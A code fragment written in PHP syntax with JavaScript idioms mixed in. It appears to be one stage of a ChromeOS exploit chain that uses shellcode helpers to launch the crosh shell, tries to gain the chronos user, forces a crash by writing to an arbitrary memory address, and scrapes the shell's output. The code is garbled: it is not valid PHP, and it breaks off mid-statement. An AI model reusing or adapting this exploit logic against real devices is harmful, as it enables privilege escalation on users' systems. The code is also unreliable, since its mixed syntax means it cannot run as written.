<?php

function log($msg) {
    signal_parent('log', array('msg' => $msg));
}

function log_drop($msg) {
    signal_parent('log_drop', array('msg' => $msg));
}

function signal_parent($cmd, $data) {
    $data['cmd'] = $cmd;
    parent::postMessage($data, '*');
}

function recv_msg($e) {
    if ($e['data']['cmd'] == 'launch_crosh') {
        launch_crosh(function($success) {
            if ($success) {
                log('in crosh process!');
                get_chronos($e['data']['origin']);
            } else {
                log('wrong process');
            }
            signal_parent('callback', array('success' => $success));
        });
    } elseif ($e['data']['cmd'] == 'crash') {
        write(mku64(0xdea), mku64(0xdbeef));
    }
}

function launch_crosh($cb) {
    log('launching crosh');
    run_sc('launch_crosh');
    function check_done() {
        $stat = read_sc('crosh_status').val();
        if (!$stat) {
            setTimeout(check_done, 10);
        } else {
            $success = $stat == 2;
            $cb($success);
        }
    }
    check_done();
}

$crosh_out = '';
function get_crosh_output() {
    $ptr = run_sc('get_crosh_output');
    $sz = run_sc('get_crosh_output_size').val();
    $crosh_out = read_str($ptr, $sz).replace('/\r/g', '');
    $cut_start = '-- crosxpl cut here --';
    $cut_end = 'FAIL: Arp table does not contain';
    $start = strpos($crosh_out, $cut_start);
    if ($start!== false) {
        $start += strlen($cut_start);
        $end = strpos($crosh_out, $cut_end, $start);
        if ($end!== false)
            $end = $end;
        else
            $end = null;
        log_drop(substr($crosh_out, $start, ($end!== null?
